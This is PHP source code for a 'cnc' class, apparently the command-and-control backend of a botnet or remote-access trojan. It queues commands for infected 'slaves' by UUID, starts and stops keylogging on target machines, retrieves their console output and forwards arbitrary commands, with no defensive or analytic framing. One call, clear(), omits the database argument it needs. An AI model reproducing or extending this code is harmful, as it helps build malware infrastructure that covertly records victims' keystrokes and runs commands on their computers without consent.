<?php
class cnc
{
  //constructor ^_^
  public function __construct() {
    //hmmmm
  }

  public function query($db, $cmd, $uuid, $arg = 'N/A' ) {
    $cmd = strtolower($cmd);
    $cmds = array('keylog','stopkeylog','getconsole');
    if($cmd === 'clear') {
      return $this->clear();
    } elseif(!$this->cooldown($db) && substr($cmd, 0, 3) !== 'get' ) {
      return 'cooldown';
    } elseif(!in_array($cmd, $cmds, true)) {
      return $this->generic_handler($db, $cmd, $uuid, $arg);
    }
    return $this->$cmd($db, $cmd, $uuid, $arg);
  }

  //check cooldown
  private function cooldown($db) {
    $cmds = $db->table('cnc')->get();
    $time = time();
    foreach($cmds as $key => $val) {
      if(($time - $val['timeIssued']) < 35) {
        return false;
      } else {
        if($val['active'] == 'true') {
          $db->table('cnc')->find('timeIssued', $val['timeIssued'], 1)->change('active', 'false');
        }
      }
    }
    return true;
  }

  //clear cnc db
  private function clear($db) {
    $table = $db->table('cnc')->get();
    foreach($table as $key => $val) {
  		$db->table('cnc')->id($key)->delete();
  	}
    return 'true';
  }

  //Reusable template for storing in the Command & Controll table
  private function store_cnc($db, $cmd, $uuid, $arg) {
    if($db->table('cnc')->put(array(
      'command'         => $cmd,
      'arguments'       => $arg,
      'timeIssued'      => time(),
      'slavesReached'   => 'UUID:',
      'target'          => (($uuid=='')?'x':"x:{$uuid}"),
      'active'					=> 'true'
    ))) {
      return 'true';
    }
  }

  //fetch console data
  private function getconsole($db, $cmd, $uuid, $arg ) {
    if($row = $db->table('console')->find('uuid', $uuid, 1)->get()) {
      $db->table('console')->find('uuid', $uuid)->change('log', '[x]');
      if($row[array_key_first($row)]['log'] != '[x]') {
        $table = $db->table('cnc')->get();
        foreach($table as $key => $val) {
  		    $db->table('cnc')->id($key)->delete();
  	    }
      }
      return $row[array_key_first($row)]['log'];
    } else {
      return "[x]";
    }
  }

  //Keylog command handling
  private function keylog($db, $cmd, $uuid, $arg) {
    if($db->table('slaves')->find('uuid', $uuid, 1)->change('keylog', 'true')) {
      return $this->store_cnc($db, $cmd, $uuid, $arg);
    }
    return 'false';
  }
  private function stopkeylog($db, $cmd, $uuid, $arg) {
    if($db->table('slaves')->find('uuid', $uuid, 1)->change('keylog', 'false')) {
      $this->store_cnc($db, $cmd, $uuid, $arg);
      return 'true';
    }
    return 'false';
  }

  //generic command handler
  private function generic_handler($db, $cmd, $uuid, $arg) {
    return $this->store_cnc($db, $cmd, $uuid, $arg);
  }
}
?>
